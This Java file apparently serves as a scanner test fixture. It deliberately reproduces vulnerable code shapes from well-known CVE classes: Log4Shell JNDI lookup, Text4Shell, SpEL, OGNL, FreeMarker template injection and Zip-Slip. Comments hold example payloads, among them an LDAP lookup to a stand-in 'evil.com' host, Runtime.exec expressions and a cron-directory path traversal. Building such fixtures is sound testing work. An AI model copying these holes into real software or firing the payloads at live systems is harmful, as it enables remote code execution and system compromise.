package com.demo;

import java.io.*;
import java.util.*;
import java.util.zip.*;
import javax.naming.*;
import javax.servlet.http.HttpServletRequest;

import org.springframework.expression.*;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.apache.commons.text.StringSubstitutor;
import ognl.Ognl;
import freemarker.template.*;

/**
 * DEMO FILE — intentional vulnerabilities modelled on famous real-world CVEs.
 *
 * Each handler reproduces the vulnerable *shape* of a high-profile CVE class so
 * the scanner's expression/template/JNDI/archive sinks get exercised.
 *
 * CVE classes covered:
 *   CWE-94  / CVE-2021-44228  Log4Shell-style JNDI lookup injection
 *   CWE-94  / CVE-2022-42889  Text4Shell — Apache Commons Text interpolation
 *   CWE-917 / SpEL            Spring Expression Language injection
 *   CWE-917 / CVE-2017-5638   Struts2-style OGNL expression injection
 *   CWE-1336/ SSTI            FreeMarker server-side template injection
 *   CWE-22  / CVE-2018-1002200 Zip-Slip archive path traversal
 */
public class AdvancedInjection {

    // CWE-94 / Log4Shell (CVE-2021-44228) — user input drives a JNDI lookup → RCE
    public Object jndiLookup(HttpServletRequest request) throws NamingException {
        String resource = request.getParameter("resource");
        Context ctx = new InitialContext();
        // Attacker sends resource=ldap://evil.com/Exploit → remote class loading
        return ctx.lookup(resource);
    }

    // CWE-94 / Text4Shell (CVE-2022-42889) — Commons Text interpolation of user input
    public String interpolate(HttpServletRequest request) {
        String input = request.getParameter("q");
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        // Attacker sends q=${script:javascript:java.lang.Runtime.getRuntime().exec(...)}
        return interpolator.replace(input);
    }

    // CWE-917 — SpEL expression injection → arbitrary method invocation
    public Object evalSpel(HttpServletRequest request) {
        String expr = request.getParameter("expr");
        ExpressionParser parser = new SpelExpressionParser();
        // Attacker sends expr=T(java.lang.Runtime).getRuntime().exec('id')
        Expression expression = parser.parseExpression(expr);
        return expression.getValue();
    }

    // CWE-917 / Struts2 OGNL (CVE-2017-5638) — OGNL evaluation of user input
    public Object evalOgnl(HttpServletRequest request, Map<String, Object> context, Object root)
            throws Exception {
        String filter = request.getParameter("filter");
        // Attacker sends an OGNL payload in the Content-Type header (Struts2 RCE)
        return Ognl.getValue(filter, context, root);
    }

    // CWE-1336 — FreeMarker SSTI: user-controlled template source
    public String renderTemplate(HttpServletRequest request) throws Exception {
        String tpl = request.getParameter("template");
        Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
        // Attacker sends template=${"freemarker.template.utility.Execute"?new()("id")}
        Template template = new Template("user", new StringReader(tpl), cfg);
        StringWriter out = new StringWriter();
        template.process(new HashMap<>(), out);
        return out.toString();
    }

    // CWE-22 / Zip-Slip (CVE-2018-1002200) — archive entry name used directly in path
    public void extractArchive(HttpServletRequest request, File destDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(request.getInputStream())) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                // Attacker crafts entry name "../../../../etc/cron.d/evil"
                File outFile = new File(destDir, entry.getName());
                try (FileOutputStream fos = new FileOutputStream(outFile)) {
                    byte[] buf = new byte[4096];
                    int n;
                    while ((n = zis.read(buf)) > 0) {
                        fos.write(buf, 0, n);
                    }
                }
            }
        }
    }
}
